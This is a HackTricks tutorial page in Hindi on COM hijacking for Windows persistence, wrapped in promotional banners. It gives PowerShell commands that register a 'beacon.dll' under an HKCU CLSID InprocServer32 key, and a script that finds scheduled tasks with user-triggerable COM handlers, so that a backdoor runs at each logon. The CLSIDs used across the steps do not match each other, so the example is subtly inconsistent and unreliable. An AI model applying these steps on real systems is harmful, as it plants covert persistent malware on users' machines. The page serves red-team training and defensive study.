# COM हाइजैकिंग

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

### अस्तित्व में न होने वाले COM components की खोज

क्योंकि HKCU के मान उपयोगकर्ताओं द्वारा संशोधित किए जा सकते हैं, **COM हाइजैकिंग** को **स्थायी तंत्र** के रूप में उपयोग किया जा सकता है। `procmon` का उपयोग करके खोजना आसान है कि कौन से COM रजिस्ट्री खोजे जा रहे हैं जो मौजूद नहीं हैं जिन्हें एक हमलावर बना सकता है ताकि स्थायी रूप से बना रह सके। फ़िल्टर:

* **RegOpenKey** ऑपरेशन।
* जहां _परिणाम_ **NAME NOT FOUND** है।
* और _पथ_ **InprocServer32** से समाप्त होता है।

एक बार जब आपने तय कर लिया है कि कौन सा अस्तित्व में न होने वाला COM अनुकरण करना है, तो निम्नलिखित कमांड चलाएं। _सावधान रहें अगर आप उस COM का अनुकरण करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है क्योंकि यह अत्यधिक हो सकता है।_&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks कस्टम ट्रिगर्स का उपयोग COM objects को बुलाने के लिए करते हैं और क्योंकि वे Task Scheduler के माध्यम से निष्पादित होते हैं, इसे पूर्वानुमान करना आसान होता है कि वे कब ट्रिगर होंगे।

<pre class="language-powershell"><code class="lang-powershell"># COM CLSIDs दिखाएं
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# नमूना आउटपुट:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [पिछले जैसा अधिक...]</code></pre>

आउटपुट की जांच करके आप एक चुन सकते हैं जो **हर बार एक उपयोगकर्ता लॉग इन करता है** उदाहरण के लिए।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** की खोज **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और HKLM और HKCU में करते हैं, आपको सामान्यत: पाता होगा कि मान HKCU में मौजूद नहीं है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
तो, आप बस HKCU एंट्री बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करता है, आपका बैकडोर चालू हो जाएगा।

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
